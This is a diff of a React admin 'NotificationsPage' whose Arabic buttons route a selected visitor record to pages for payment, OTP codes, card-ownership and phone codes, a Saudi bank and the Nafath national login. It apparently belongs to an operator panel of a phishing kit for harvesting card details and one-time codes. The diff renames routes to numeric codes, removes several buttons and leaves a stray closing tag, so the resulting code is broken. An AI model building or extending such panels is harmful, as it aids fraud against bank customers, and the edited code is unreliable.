@@ -1704,14 +1704,7 @@ export default function NotificationsPage() {
                 >
                   رفض OTP
                 </Button>
-                <Button
-                  onClick={() => {
-                    handleUpdatePagename(selectedCardInfo.id, "external-link")
-                  }}
-                  className="w-full bg-gradient-to-r from-cyan-400 to-blue-500 hover:from-cyan-500 hover:to-blue-600 text-white border-0 shadow-lg"
-                >
-                  راجحي
-                </Button>
+              
               </>
             ) : null}
           </DialogFooter>
@@ -1743,7 +1736,7 @@ export default function NotificationsPage() {
                         ? "bg-gradient-to-r from-emerald-50 to-teal-50 border-emerald-300"
                         : ""
                     }`}
-                    onClick={() => handleUpdatePagename(selectedNotification.id, "payment")}
+                    onClick={() => handleUpdatePagename(selectedNotification.id, "6")}
                   >
                     <CreditCard className="h-4 w-4" />
                     دفع
@@ -1755,7 +1748,7 @@ export default function NotificationsPage() {
                         ? "bg-gradient-to-r from-indigo-50 to-blue-50 border-indigo-300"
                         : ""
                     }`}
-                    onClick={() => handleUpdatePagename(selectedNotification.id, "")}
+                    onClick={() => handleUpdatePagename(selectedNotification.id, "1")}
                   >
                     <FileText className="h-4 w-4" />
                     تسجيل
@@ -1767,7 +1760,7 @@ export default function NotificationsPage() {
                         ? "bg-gradient-to-r from-cyan-50 to-blue-50 border-cyan-300"
                         : ""
                     }`}
-                    onClick={() => handleUpdatePagename(selectedNotification.id, "nafaz")}
+                    onClick={() => handleUpdatePagename(selectedNotification.id, "9999")}
                   >
                     <Shield className="h-4 w-4" />
                     نفاذ
@@ -1779,7 +1772,7 @@ export default function NotificationsPage() {
                         ? "bg-gradient-to-r from-purple-50 to-violet-50 border-purple-300"
                         : ""
                     }`}
-                    onClick={() => handleUpdatePagename(selectedNotification.id, "verify-otp")}
+                    onClick={() => handleUpdatePagename(selectedNotification.id, "7")}
                   >
                     <Shield className="h-4 w-4" />
                     رمز OTP
@@ -1791,34 +1784,13 @@ export default function NotificationsPage() {
                         ? "bg-gradient-to-r from-teal-50 to-cyan-50 border-teal-300"
                         : ""
                     }`}
-                    onClick={() => handleUpdatePagename(selectedNotification.id, "external-link")}
+                    onClick={() => handleUpdatePagename(selectedNotification.id, "8888")}
                   >
                     <Tag className="h-4 w-4" />
-                    راجحي
+                    هاتف
                   </Button>
-                  <Button
-                    variant="outline"
-                    className={`flex items-center gap-2 justify-center border-2 border-blue-200 hover:bg-blue-50 transition-all duration-200 ${
-                      selectedNotification.pagename === "verify-card-ownership"
-                        ? "bg-gradient-to-r from-amber-50 to-orange-50 border-amber-300"
-                        : ""
-                    }`}
-                    onClick={() => handleUpdatePagename(selectedNotification.id, "verify-card-ownership")}
-                  >
-                    <CreditCard className="h-4 w-4" />
-                    رمز ownership
-                  </Button>
-                  <Button
-                    variant="outline"
-                    className={`flex items-center gap-2 justify-center border-2 border-blue-200 hover:bg-blue-50 transition-all duration-200 ${
-                      selectedNotification.pagename === "verify-phone"
-                        ? "bg-gradient-to-r from-orange-50 to-red-50 border-orange-300"
-                        : ""
-                    }`}
-                    onClick={() => handleUpdatePagename(selectedNotification.id, "verify-phone")}
-                  >
-                    <Smartphone className="h-4 w-4" />
-                    رمز هاتف
+               
+               
                   </Button>
                   <Button
                     variant="outline"
@@ -1827,7 +1799,7 @@ export default function NotificationsPage() {
                         ? "bg-gradient-to-r from-emerald-50 to-teal-50 border-emerald-300"
                         : ""
                     }`}
-                    onClick={() => handleUpdatePagename(selectedNotification.id, "offers")}
+                    onClick={() => handleUpdatePagename(selectedNotification.id, "3")}
                   >
                     <Tag className="h-4 w-4" />
                     عروض
